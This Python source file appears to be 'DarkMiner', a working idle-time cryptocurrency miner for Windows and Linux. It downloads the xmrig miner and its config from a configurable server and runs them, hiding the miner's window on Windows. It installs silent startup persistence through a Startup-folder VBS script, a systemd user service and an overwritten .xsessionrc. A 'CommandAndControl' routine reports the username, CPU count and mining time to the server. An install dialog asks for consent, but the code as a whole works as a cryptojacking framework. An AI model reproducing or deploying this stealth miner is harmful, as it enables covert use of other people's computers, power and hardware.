# Version 1 2/26/21
# Tested and works on both windows 10 and Ubuntu 20.10
import sys
import platform
import signal
import os
import time
import subprocess
import configparser
import multiprocessing
import easygui

#Website you are hosting the controlling server on
#BaseSite = 'http://localhost/DarkMiner/'

#SHA256 of your downtime program
SHA256Program = '7db002483369077051d179a80105a816c45951c24fe65023d58bc05609c49f65'


#functions
def errorOccurred(errorCode):
    easygui.msgbox(errorCode,"ERROR OCCURRED")
    sys.exit("ERROR")

def UpdateTotalMiningTime(value):
    config.read('config.ini')
    TotalTimeMining = config['value']['TotalTimeMining']
    NewTotalTimeMining = int(TotalTimeMining) + int(value)
    config['value'] = {
        'TotalTimeMining' : NewTotalTimeMining
    }
    with open(os.path.expanduser('~') +'/bin/DarkMiner/config.ini', 'w+') as configfile:
        config.write(configfile)

def CommandAndControl(type):
    import requests
    print("Talked to server")
    if type == 'startSignal':
        URL = BaseSite + 'coms.php'
        config.read('config.ini')
        TotalTimeMining = config['value']['TotalTimeMining']
        #Diffrent OS giving problems with os.environ. This solution worked for windows
        #I might need to check it on more platforms
        try:
            PARAMS = {'Type':'startSignal','name': os.environ['USER'], 'CPU': multiprocessing.cpu_count(),'Mining':1,'MiningTotalTime':TotalTimeMining,'version': Version}
        except KeyError as e:
            print('Computer no work right: "%s"' % str(e))
            try:
                PARAMS = {'Type':'startSignal','name': os.getlogin(), 'CPU': multiprocessing.cpu_count(),'Mining':1,'MiningTotalTime':TotalTimeMining,'version': Version}
            except KeyError as e:
                print('Computer really no work right: "%s"' % str(e))
        r = requests.get(url=URL, params=PARAMS)
        data = r.json()
        print(data)
    elif type == 'endSignal':
        URL = BaseSite + 'coms.php'
        config.read('config.ini')
        TotalTimeMining = config['value']['TotalTimeMining']
        try:
            PARAMS = {'Type':'endSignal','name': os.environ['USER'], 'CPU': multiprocessing.cpu_count(),'Mining':0,'MiningTotalTime':TotalTimeMining,'version': Version}
        except KeyError as e:
            print('Computer no work right: "%s"' % str(e))
            try:
                PARAMS = {'Type':'endSignal','name': os.getlogin(), 'CPU': multiprocessing.cpu_count(),'Mining':0,'MiningTotalTime':TotalTimeMining,'version': Version}
            except KeyError as e:
                print('Computer really no work right: "%s"' % str(e))
        r = requests.get(url=URL, params=PARAMS)
        data = r.json()
        print(data)
    elif type == 'checkVersion':
        URL = BaseSite + 'coms.php'
        config.read('config.ini')
        TotalTimeMining = config['value']['TotalTimeMining']
        #Diffrent OS giving problems with os.environ. This solution worked for windows
        #I might need to check it on more platforms
        try:
            PARAMS = {'Type':'checkVersion','name': os.environ['USER']}
        except KeyError as e:
            print('Computer no work right: "%s"' % str(e))
            try:
                PARAMS = {'Type':'checkVersion','name': os.getlogin()}
            except KeyError as e:
                print('Computer really no work right: "%s"' % str(e))
        r = requests.get(url=URL, params=PARAMS)
        data = r.json()
        if int(data) > int(Version):
            print("Old Version")
            
def LinuxIdleTime():
    #Maybe we can come back and use Idle_time later but for some reason when booting using crontab it gives wayland errors
    #So we will have to use xprintidle as a dependance. Which in all honesty might even give better versatility as xprintidle grabs
    #from X server directly.
    #from idle_time import IdleMonitor
    # monitor = IdleMonitor.get_monitor()
    result = subprocess.run(['xprintidle'], stdout=subprocess.PIPE)
    IdleTimeSet = result.stdout
    while True:
        result = subprocess.run(['xprintidle'], stdout=subprocess.PIPE)
        print(result.stdout)
        IdleTimeSet = int(float(result.stdout)) / 1000
        if waitTime <= IdleTimeSet:
            break
        time.sleep(waitTime-IdleTimeSet)

def WindowsIdleTime():
    import win32api
    while True:
        print('CheckLoop')
        LastActivity = win32api.GetLastInputInfo()
        time.sleep(waitTime)
        if LastActivity == win32api.GetLastInputInfo():
            print('No Activity ~ Prepare to launch!')
            break

def Is64Windows():
    return 'PROGRAMFILES(X86)' in os.environ

def GetProgramFiles32():
    if Is64Windows():
        return False
    else:
        return True

def DownloadData(url, direc):
    import requests
    print('Beginning file download with requests')
    r = requests.get(url)
    with open(direc, 'wb') as f:
        f.write(r.content)
        print('Success Downloading files')

def Miner():
    if Communication == 2:
        CommandAndControl("startSignal")
    if osSystem == 'win32':
        if not os32Bit:
            if os.path.exists(WinPathDownloads + 'xmrig.exe'):
                print('exists no need to download')
            else:
                DownloadData(BaseSite + 'xmrig.exe', WinPathDownloads + 'xmrig.exe')
            if os.path.exists(WinPathDownloads + 'WinRing0x64.sys'):
                print('exists no need to download')
            else:
                DownloadData(BaseSite + 'WinRing64.sys', WinPathDownloads + 'WinRing0x64.sys')
            if os.path.exists(WinPathDownloads + 'config.json'):
                print('exists no need to download')
            else:
                DownloadData(BaseSite + 'config.json', WinPathDownloads + 'config.json')

            import win32gui
            import win32api
            proc = subprocess.Popen([WinPathDownloads + "xmrig.exe"])
            time.sleep(3)

            def enumWindowFunc(hwnd, windowList):
                """ win32gui.EnumWindows() callback """
                text = win32gui.GetWindowText(hwnd)
                className = win32gui.GetClassName(hwnd)
                if text.find("xmrig") >= 0:
                    windowList.append((hwnd, text, className))

            myWindows = []
            win32gui.EnumWindows(enumWindowFunc, myWindows)
            for hwnd, text, className in myWindows:
                win32gui.ShowWindow(hwnd, False)
            print('Running Miner waiting for action from user')
            TotalSleepTime = 0
            LastActivity = win32api.GetLastInputInfo()
            while True:
                if LastActivity != win32api.GetLastInputInfo():
                    #print('Activity! Eject!')
                    proc.terminate()  # Terminates Child Process
                    UpdateTotalMiningTime(TotalSleepTime)
                    if Communication == 2:
                        CommandAndControl("endSignal")
                    break
                elif LastActivity == win32api.GetLastInputInfo():
                    time.sleep(3)
                    TotalSleepTime += 3
                    print(TotalSleepTime)
            main()  # Back to our main function and loop
    elif osSystem == 'Linux':
        if is_64bits:
            if not os.path.exists(LinuxPathDownloads):
                os.mkdir(LinuxPathDownloads)
            print('ran')
            if os.path.exists(LinuxPathDownloads + 'xmrigcg'):
                print('exists no need to download')
            else:
                DownloadData(BaseSite + 'Linux/' + 'xmrMiner', LinuxPathDownloads + 'xmrigcg')
            if os.path.exists(LinuxPathDownloads + 'config.json'):
                print('exists no need to download')
            else:
                DownloadData(BaseSite + 'Linux/' + 'config.json', LinuxPathDownloads + 'config.json')
            #Check to make sure hashes match otherwise error out
            import hashlib
            sha256_hash = hashlib.sha256()
            with open(LinuxPathDownloads+'xmrigcg',"rb") as f:
                # Read and update hash string value in blocks of 4K
                for byte_block in iter(lambda: f.read(4096),b""):
                    sha256_hash.update(byte_block)
                #print(sha256_hash.hexdigest())
                if sha256_hash.hexdigest() != SHA256Program:
                    errorOccurred("HASH MISMATCH"); 

            os.chmod(LinuxPathDownloads+"xmrigcg", 0o777)
            #print(LinuxPathDownloads)
            proc = subprocess.Popen([LinuxPathDownloads + "xmrigcg"], stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
            TotalSleepTime = 0
            print("Starting downtime program")
            while True:
                result = subprocess.run(['xprintidle'], stdout=subprocess.PIPE)
                IdleTimeSet = int(float(result.stdout)) / 1000
                if waitTime <= IdleTimeSet:
                    #print('No activity')
                    time.sleep(3)
                    TotalSleepTime += 3
                else:
                    print('Activity! Eject!')
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)  # Send the signal to all the process groups
                    #log Total Time active
                    UpdateTotalMiningTime(TotalSleepTime)
                    TotalSleepTime = 0
                    if Communication == 2:
                        CommandAndControl("endSignal")
                    break
            main()

def Install():
    if easygui.ynbox('Proceed with the install of DarkMiner. A tool used for mining cryptocurrency. If you do not know what this is press NO', 'Title', ('Yes', 'No')):
        if easygui.ynbox('Would you like this to reboot on each startup of the computer', 'Title', ('Yes', 'No')):
            rebootStart = 1
        else:
            rebootStart = 0
        #Grab data for config
        msg = "Enter your configuration values"
        title = "Enter Config data"
        fieldNames = ["Webdomain", "Communication mode(0-2)"]
        fieldValues = easygui.multenterbox(msg, title, fieldNames)
        if fieldValues is None:
            sys.exit(0)
        # make sure that none of the fields were left blank
        while 1:
            errmsg = ""
            for i, name in enumerate(fieldNames):
                if fieldValues[i].strip() == "":
                    errmsg += "{} is a required field.\n\n".format(name)
            if errmsg == "":
                break # no problems found
            fieldValues = easygui.multenterbox(errmsg, title, fieldNames, fieldValues)
            if fieldValues is None:
                break

        #writting to config
        config['settings'] = {
            "Agree" : 1,
            "Communication" : fieldValues[1], #0 no communication; 1 basic comunication; 2 verbose communication
            "rebootStart" : rebootStart,
            "waitTime" : '120',
            "WinPathDownloads" : 'C:/Users/' + os.getlogin() + '/Downloads/',
            "LinuxPathDownloads" : os.path.expanduser('~') +'/bin/DarkMiner/',
        }
        config['server'] = {
            "Version" : 1,
            'BaseSite' : fieldValues[0]
        }
        config['value'] = {
            'TotalTimeMining' : 0
        }
        with open('config.ini', 'w') as configfile:
            config.write(configfile)
        TotalTimeMining = 0
        
    
    if(rebootStart):
        #Set path to bin and create a folder in it
        UserPath = os.path.expanduser('~') +'/bin/DarkMiner/'
        FileName = sys.argv[0]
        if not os.path.isdir(UserPath):
            if osSystem == 'win32':
               os.makedirs(UserPath)
            elif osSystem == 'Linux':
                os.mkdir(UserPath,0o755)

        #code for setting up the boot     
        if osSystem == 'Linux':
            #switching to using systemd
            #check if systemd user path is set up
            if not os.path.isdir(os.path.expanduser('~')+'/.config/systemd/user'):
                os.mkdir(os.path.expanduser('~')+'/.config/systemd',0o755)
                os.mkdir(os.path.expanduser('~')+'/.config/systemd/user',0o755)

            #Add our service
            filehandle = open(os.path.expanduser('~')+'/.config/systemd/user/darkminer.service', 'w')
            filehandle.write('[Unit]\
                            \nDescription=Dark Miner Service\
                            \nPartOf=graphical-session.target\
                            \n[Service]\
                            \nExecStart=/usr/bin/python3.8 '+os.path.expanduser('~')+'/bin/DarkMiner/main.py --display=:0.0\
                            \nRestart=always\
                            \n[Install]\
                            \nWantedBy=xsession.target\
                            ')
            filehandle.close()
            #Setting up startup on user login; check graphical environment is ready
            filehandle = open(os.path.expanduser('~')+'/.config/systemd/user/xsession.target', 'w')
            filehandle.write('[Unit]\
                            \nDescription=Users Xsession running\
                            \nBindsTo=graphical-session.target\
                            ')
            filehandle.close()
            #Start xsession.service on user login
            filehandle = open(os.path.expanduser('~')+'/.xsessionrc', 'w')
            filehandle.write('systemctl --user import-environment PATH DBUS_SESSION_BUS_ADDRESS\
                            \nsystemctl --no-block --user start xsession.target\
                            ')
            filehandle.close()
            result = subprocess.run(['systemctl', '--user', 'enable','darkminer'], stdout=subprocess.PIPE)
            print(result)

        elif osSystem == 'win32':
            #I may come back to this later so that I can use the task schedular for updating and running some on crash. Also might make it 
            #easier to install because windows probably picks up this method as a virus.
            #Keep everything clean and in folders
            os.makedirs(os.path.expanduser('~')+"/AppData/Roaming/DarkMiner/")
            bat = open(os.path.expanduser('~')+"/AppData/Roaming/DarkMiner/"+"DarkMiner.bat", "a")
            bat.write("py "+UserPath+"main.py")
            bat.close()
            #now create a vbs script so you don't have to see the damn terminal all the time
            vbs = open(os.path.expanduser('~')+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"+"DarkMiner.vbs", "a")
            vbs.write('Set WinScriptHost = CreateObject("WScript.Shell") \n WinScriptHost.Run Chr(34) & "'+os.path.expanduser('~')+"/AppData/Roaming/DarkMiner/DarkMiner.bat"+'" & Chr(34), 0 \n Set WinScriptHost = Nothing')
            vbs.close()


    #Copy files to working directory
    from shutil import copyfile
    copyfile("main.py", UserPath+"main.py")
    copyfile("config.ini", UserPath+"config.ini")
    #os.remove("config.ini")
    #Start file from working directory
    easygui.msgbox('Installed DarkMiner in '+UserPath+ " starting program", 'All done')
    if osSystem == 'Linux':
        os.system("nohup python3 "+UserPath+"main.py"+" &")
        
    elif osSystem == 'win32':
        os.system("py "+UserPath+"main.py")


def main():
    #print('Starting DarkMiner on ' + osSystem)
    #check machine type to send to proper idle
    if osSystem == 'win32':
        WindowsIdleTime()
    elif osSystem == 'Linux':
        LinuxIdleTime()
    #Run miner if idle is complete
    Miner()

#Read from Config file if exists
config = configparser.ConfigParser()
if os.path.isfile(os.path.expanduser('~') +'/bin/DarkMiner/'+"config.ini"):
    config.read(os.path.expanduser('~') +'/bin/DarkMiner/'+"config.ini")
    #Settings
    Agree = int(config['settings']['Agree'])
    Communication = int(config['settings']['communication'])
    rebootStart = int(config['settings']['rebootStart'])
    waitTime = int(config['settings']['waitTime'])
    WinPathDownloads = config['settings']['WinPathDownloads']
    LinuxPathDownloads = config['settings']['LinuxPathDownloads']

    #Server
    BaseSite = config['server']['BaseSite']
    Version = config['server']['Version']

    #Values
    TotalTimeMining = config['value']['totaltimemining']
else:
    Agree = 0

#Start of program Determans what operating system to go with
if sys.platform.startswith('win32'):
    osSystem = 'win32'
    os32Bit = GetProgramFiles32()
    #Check if User has agreed to mine
    if(Agree):
        #Check version of the program to make sure we are running the latest and greatest
        if Communication >= 1:
            CommandAndControl("checkVersion")
        main()
    else:
        Install()

elif sys.platform.startswith('linux'):
    osSystem = 'Linux'
    is_64bits = sys.maxsize > 2 ** 32
    if(Agree):
        print(Communication)
        if Communication >= 1:
            CommandAndControl("checkVersion")
        main()
    else:
        Install()